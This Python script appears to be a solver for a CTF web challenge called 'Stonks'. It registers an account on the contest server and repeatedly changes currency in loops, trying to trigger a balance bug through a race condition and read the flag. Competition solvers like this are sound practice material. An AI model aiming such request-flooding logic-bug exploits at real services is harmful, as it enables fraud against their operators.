import requests
import time

# Target URL
BASE_URL = "http://ctf.compfest.id:7303"

def register_user(username, password):
    """Register a new user"""
    session = requests.Session()
    
    data = {
        "username": username,
        "password": password,
        "confirm_password": password
    }
    
    response = session.post(f"{BASE_URL}/register", data=data)
    print(f"Register response: {response.status_code}")
    return session

def login_user(session, username, password):
    """Login user"""
    data = {
        "username": username,
        "password": password
    }
    
    response = session.post(f"{BASE_URL}/login", data=data)
    print(f"Login response: {response.status_code}")
    return session

def change_currency(session, currency):
    """Change currency"""
    data = {
        "currency": currency
    }
    
    response = session.post(f"{BASE_URL}/change-currency", data=data)
    print(f"Change currency to {currency}: {response.status_code}")
    return session

def check_rich(session):
    """Check if we're rich enough for flag"""
    response = session.get(f"{BASE_URL}/are-you-rich")
    print(f"Are you rich page: {response.status_code}")
    if response.status_code == 200:
        print(f"Rich check content: {response.text}")
        if "FLAG" in response.text:
            print("üéâ FLAG FOUND! üéâ")
            return True
    return False

def exploit_bug():
    """Exploit the specific bug in change_currency function"""
    username = f"bug_user_{int(time.time())}"
    password = "password123"
    
    print(f"Creating user: {username}")
    
    # Register and login
    session = register_user(username, password)
    session = login_user(session, username, password)
    
    # The bug: Try to trigger the condition where user_balances[u] doesn't exist
    # but user_currencies[u] also doesn't exist, causing the bug:
    # user_balances[u] = STONKS_GIFT * user_currencies[u]
    
    print("\n=== Exploiting the bug ===")
    
    # Strategy: Try to create a situation where user_currencies[u] might be None or missing
    # by doing multiple rapid currency changes that might cause race conditions
    
    # Test 1: Rapid currency changes
    print("\n--- Test 1: Rapid currency changes ---")
    for i in range(20):
        session = change_currency(session, "KRW")
        session = change_currency(session, "AUD")
        if check_rich(session):
            return True
        time.sleep(0.05)
    
    # Test 2: Try to exploit the bug condition more aggressively
    print("\n--- Test 2: Aggressive bug exploitation ---")
    for i in range(30):
        session = change_currency(session, "JPY")
        session = change_currency(session, "KRW")
        session = change_currency(session, "AUD")
        if check_rich(session):
            return True
        time.sleep(0.03)
    
    # Test 3: Try to create race conditions
    print("\n--- Test 3: Race conditions ---")
    for i in range(40):
        session = change_currency(session, "GBP")
        session = change_currency(session, "KRW")
        session = change_currency(session, "AUD")
        if check_rich(session):
            return True
        time.sleep(0.02)
    
    return False

if __name__ == "__main__":
    print("=== SIMPLE STONKS EXPLOIT ===")
    print(f"Target URL: {BASE_URL}")
    
    if exploit_bug():
        print("üéâ EXPLOIT SUCCESSFUL! üéâ")
    else:
        print("‚ùå Exploit failed")
    
    print("\n=== Exploit completed ===") 